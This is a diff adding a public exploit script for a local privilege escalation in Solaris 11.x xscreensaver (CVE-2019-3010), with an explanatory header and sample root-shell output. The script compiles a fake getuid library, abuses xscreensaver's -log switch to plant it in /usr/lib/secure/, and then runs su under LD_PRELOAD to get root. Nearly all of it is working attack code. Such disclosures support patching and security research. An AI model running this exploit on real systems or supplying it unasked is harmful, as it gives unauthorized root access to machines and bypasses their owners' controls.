@@ -1,0 +1,81 @@
+# Exploit Title: Solaris xscreensaver 11.4 - Privilege Escalation
+# Date: 2019-10-16
+# Exploit Author: Marco Ivaldi
+# Vendor Homepage: https://www.oracle.com/technetwork/server-storage/solaris11/
+# Version: Solaris 11.x
+# Tested on: Solaris 11.4 and 11.3 X86
+# CVE: N/A
+
+#!/bin/sh
+
+#
+# raptor_xscreensaver - Solaris 11.x LPE via xscreensaver
+# Copyright (c) 2019 Marco Ivaldi <raptor@0xdeadbeef.info>
+#
+# Exploitation of a design error vulnerability in xscreensaver, as 
+# distributed with Solaris 11.x, allows local attackers to create
+# (or append to) arbitrary files on the system, by abusing the -log
+# command line switch introduced in version 5.06. This flaw can be
+# leveraged to cause a denial of service condition or to escalate
+# privileges to root. This is a Solaris-specific vulnerability,
+# caused by the fact that Oracle maintains a slightly different
+# codebase from the upstream one (CVE-2019-3010).
+#
+# "I'd rather be lucky than good any day." -- J. R. "Bob" Dobbs
+# "Good hackers force luck." -- ~A.
+#
+# This exploit targets the /usr/lib/secure/ directory in order
+# to escalate privileges with the LD_PRELOAD technique. The
+# implementation of other exploitation vectors, including those
+# that do not require gcc to be present on the target system, is
+# left as an exercise to fellow UNIX hackers;)
+#
+# Usage:
+# raptor@stalker:~$ chmod +x raptor_xscreensaver
+# raptor@stalker:~$ ./raptor_xscreensaver
+# [...]
+# Oracle Corporation      SunOS 5.11      11.4    Aug 2018
+# root@stalker:~# id
+# uid=0(root) gid=0(root)
+# root@stalker:~# rm /usr/lib/secure/64/getuid.so /tmp/getuid.*
+#
+# Vulnerable platforms:
+# Oracle Solaris 11 X86 [tested on 11.4 and 11.3]
+# Oracle Solaris 11 SPARC [untested]
+#
+
+echo "raptor_xscreensaver - Solaris 11.x LPE via xscreensaver"
+echo "Copyright (c) 2019 Marco Ivaldi <raptor@0xdeadbeef.info>"
+echo
+
+# prepare the payload
+echo "int getuid(){return 0;}" > /tmp/getuid.c
+gcc -fPIC -Wall -g -O2 -shared -o /tmp/getuid.so /tmp/getuid.c -lc
+if [ $? -ne 0 ]; then
+	echo "error: problem compiling the shared library, check your gcc"
+	exit 1
+fi
+
+# check the architecture
+LOG=/usr/lib/secure/getuid.so
+file /bin/su | grep 64-bit >/dev/null 2>&1
+if [ $? -eq 0 ]; then
+	LOG=/usr/lib/secure/64/getuid.so
+fi
+
+# start our own xserver
+# alternatively we can connect back to a valid xserver (e.g. xquartz)
+/usr/bin/Xorg :1 &
+
+# trigger the bug
+umask 0
+/usr/bin/xscreensaver -display :1 -log $LOG &
+sleep 5
+
+# clean up
+pkill -n xscreensaver
+pkill -n Xorg
+
+# LD_PRELOAD-fu
+cp /tmp/getuid.so $LOG
+LD_PRELOAD=$LOG su -
